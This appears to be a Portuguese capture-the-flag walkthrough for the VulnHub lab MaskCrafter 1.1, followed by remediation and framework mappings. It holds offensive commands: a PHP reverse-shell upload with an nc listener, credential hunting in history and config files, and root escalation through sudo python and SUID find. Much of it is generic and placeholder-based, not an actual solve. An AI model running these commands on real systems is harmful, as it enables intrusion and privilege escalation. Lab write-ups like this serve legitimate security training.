# MaskCrafter: 1.1 — Descasque Cada Camada até o Root

Bora rapaziada!! MaskCrafter é exatamente o que o nome diz: uma máquina construída em torno do conceito de revelar progressivamente informações ocultas através de codificação, enumeração web e extração de credenciais. Cada flag e credencial está atrás de mais uma camada de ofuscação. É um teste legit de paciência e pensamento sistemático, e honestamente é uma máquina subestimada na comunidade VulnHub. Sem dúvida.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | MaskCrafter: 1.1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/maskcrafter-11,546/ |
| **Técnicas** | Enumeração Nmap, brute-force de diretórios web, análise de código fonte, cadeias de codificação/decodificação (Base64, hex, ROT13), extração de credenciais de comentários ou arquivos, login SSH, escalação de privilégios via sudo/SUID |
| **CVEs** | CWE-200 (exposição de informação através de dados codificados em respostas web), CWE-521 (requisitos de senha fracos), CWE-269 (gerenciamento impróprio de privilégios) |
| **Grupos APT** | APT41: usa codificação em camadas e ofuscação em canais C2 baseados em web; FIN7: emprega descoberta progressiva de credenciais através de cadeias de codificação em ataques a aplicações web |

---

## Resumo do Ataque

```
nmap → HTTP 80, possivelmente portas adicionais
  → gobuster: enumerar diretórios web
  → análise de código fonte: comentários HTML com strings codificadas
  → cadeia de decodificação: Base64/hex/ROT13 → credenciais ou caminhos
  → login no CMS ou painel web admin
  → upload de arquivo ou execução de comando → shell www-data
  → enumeração de /home/ → arquivos de credenciais
  → SSH como usuário baixo
  → sudo -l ou binário SUID → root
  → /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas e fingerprinting de serviços
2. Enumeração de diretórios web e revisão de código fonte
3. Decodificar todas as strings codificadas encontradas em comentários HTML e arquivos JS
4. Seguir caminhos descobertos para páginas ocultas ou arquivos de credenciais
5. Exploração web para foothold inicial
6. Enumeração do sistema para vetores de escalação de privilégios
7. Escalar para root via sudo ou SUID
8. Capturar flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.110

nmap -sV -sC -p- 192.168.1.110
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.x.x
22/tcp open  ssh     OpenSSH 7.x
```

Web e SSH padrão. Tudo começa com enumeração web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

```bash
# Brute-force de diretórios
gobuster dir \
  -u http://192.168.1.110/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip \
  -t 40 \
  -o /tmp/maskcrafter_dirs.txt

cat /tmp/maskcrafter_dirs.txt
```

```bash
# Também tentar feroxbuster para enumeração recursiva
feroxbuster -u http://192.168.1.110/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt \
  --depth 3
```

Verificar a fonte HTML de cada página descoberta:

```bash
curl -s http://192.168.1.110/ | grep -i "<!--\|hidden\|base64\|password\|user\|hint"
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Decodificar a Cadeia de Credenciais

Cada string codificada encontrada deve ser decodificada sistematicamente:

```bash
# Decodificar Base64
echo "STRING_CODIFICADA" | base64 -d

# Decodificar hex
echo "string_hex" | xxd -r -p
# ou
python3 -c "print(bytes.fromhex('string_hex').decode())"

# ROT13
echo "texto_rotacionado" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Decodificar URL
python3 -c "import urllib.parse; print(urllib.parse.unquote('URL_CODIFICADA'))"
```

Construa uma cadeia de decodificação: cada valor decodificado pode revelar outra string codificada ou um caminho para verificar. Mantenha um arquivo de notas:

```bash
tee /tmp/maskcrafter_notas.txt << 'EOF'
Camada 1: [fonte da string codificada] → [valor decodificado]
Camada 2: [localização da camada 1] → [valor decodificado]
...
EOF
```

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — Foothold Inicial

Dependendo do que a cadeia de decodificação revelar, o foothold pode vir por:

**Caminho A: Login no CMS com credenciais descobertas:**

```bash
# Tentar credenciais descobertas em qualquer formulário de login
# Caminhos comuns: /admin/, /wp-admin/, /cms/, /login.php
curl -s http://192.168.1.110/admin/ | head -30
```

**Caminho B: Upload de arquivo no admin web:**

```bash
# Criar PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Editar LHOST e LPORT

# Iniciar listener
nc -lvnp 4444

# Fazer upload pelo painel admin e acionar
```

**Caminho C: Uso direto de credencial para SSH se a cadeia revelar credenciais SSH:**

```bash
ssh usuario_descoberto@192.168.1.110
```

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Voltada ao Público; T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Estabilização da Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm SHELL=bash
# Ctrl+Z
stty raw -echo; fg
```

---

## Passo 6 — Enumeração Pós-Exploração

```bash
# Verificar diretórios home em busca de dicas
ls -la /home/
cat /home/*/.bash_history 2>/dev/null
find /home -name "*.txt" -o -name "*.conf" -o -name "flag*" 2>/dev/null

# Verificar arquivos interessantes na raiz web
find /var/www/html -name "config*" -o -name "*.php" | xargs grep -i "pass\|cred\|secret" 2>/dev/null

# Enumerar vetores de escalação
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
```

---

## Passo 7 — Escalação de Privilégios

**Via má configuração sudo:**

```bash
sudo -l
# Exemplo: (root) NOPASSWD: /usr/bin/python3

sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Via binário SUID:**

```bash
find / -perm -u=s -type f 2>/dev/null | grep -v snap

# Verificar GTFOBins para qualquer binário encontrado
# Exploits SUID comuns:
# /usr/bin/find: find / -exec /bin/bash -p \; -quit
# /usr/bin/python: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial codificada camada 1 | (Base64/hex no HTML) | análise de fonte web | cadeia de decodificação |
| Credencial web admin | (derivada da cadeia de decodificação) | strings decodificadas | login CMS/admin |
| Credencial SSH | (de pós-exploit ou arquivos de config) | /home/ ou config web | movimento lateral |
| Flag root | /root/flag.txt | pós-exploração | conclusão do desafio |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Credenciais ocultas em comentários HTML codificados | Desenvolvedores embutem credenciais na fonte durante testes; raramente são removidas | Varredura automatizada de segredos (trufflehog, gitleaks) deve rodar em cada commit |
| 2 | Codificação em múltiplas camadas cria falsa sensação de segurança | Codificação (Base64, hex, ROT13) não é criptografia: qualquer um com scripts básicos pode decodificar | Use gerenciamento adequado de segredos; nunca codifique credenciais na fonte |
| 3 | Aplicação web permite upload de arquivo levando a RCE | Upload irrestrito de arquivo está consistentemente no OWASP Top 10 | Valide uploads no lado do servidor; armazene fora da raiz web; nunca execute arquivos enviados |
| 4 | Má configuração sudo concede acesso de interpretador ao root | Conceder sudo para Python, Perl ou qualquer interpretador efetivamente concede root | Restrinja sudo a comandos específicos não interpretadores; exigir senha |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados | T1027 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público | T1190 |
| Execução | Execução | Interpretador de Script: Unix Shell | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Varredura automatizada de segredos**: integrar trufflehog ou gitleaks no CI/CD; varrer todos os branches em busca de credenciais codificadas
2. **Gerenciamento adequado de segredos**: usar Vault ou variáveis de ambiente; nunca embutir credenciais no código fonte, mesmo codificadas
3. **Validação de upload de arquivo**: validar MIME type, extensão e magic bytes no lado do servidor; rejeitar tipos executáveis
4. **Hardening sudo**: sem concessões de interpretador; exigir senha; restringir a comandos mínimos necessários
5. **Revisão de código da aplicação web**: auditar todos os templates HTML e arquivos JS em busca de segredos codificados antes da implantação

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações voltadas à web; auditar segredos codificados |
| Proteger | Segurança de Dados | Plataforma de gerenciamento de segredos; remover credenciais da fonte |
| Proteger | Controle de Acesso | Restringir upload de arquivo; hardening sudo |
| Detectar | Anomalias e Eventos | Alertar sobre criações inesperadas de arquivo em diretórios web |
| Responder | Planejamento de Resposta | Remover shells enviadas; rotacionar todas as credenciais expostas |
| Recuperar | Planejamento de Recuperação | Auditoria de código para remover todos os segredos codificados; reimplantar builds limpos |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Restringir funcionalidade de upload de arquivo |
| AC-6 | Menor Privilégio | Concessões sudo mínimas; sem acesso a interpretador |
| IA-5 | Gerenciamento de Autenticador | Rotacionar credenciais expostas; usar gerenciador de segredos |
| SA-15 | Processo de Desenvolvimento, Padrões e Ferramentas | Varredura de segredos integrada no SDLC |
| CM-7 | Funcionalidade Mínima | Desabilitar recursos de aplicação web não utilizados |

### CISA KEV

Exposição de credenciais de aplicação web através de análise de código fonte é citada em múltiplos Avisos CISA. A combinação de credenciais codificadas e upload irrestrito de arquivo representa dois dos padrões mais explorados em ataques a aplicações web.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais e Autenticação | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Consciência Situacional (SA) | Monitorar e Analisar Logs | MIL2 |

---

## Considerações Finais

MaskCrafter: 1.1 é uma máquina sólida para construir o hábito de revisão completa de código fonte, mano. A maioria dos pentesters passa rápido por comentários HTML, e essa máquina pune isso. A codificação em camadas é uma representação justa de como desenvolvedores reais acham que estão escondendo coisas. A lição é sempre a mesma: codificação não é criptografia, e código do lado do cliente não tem segredos. Gg.

Thanks guys!! (❍ᴥ❍ʋ)
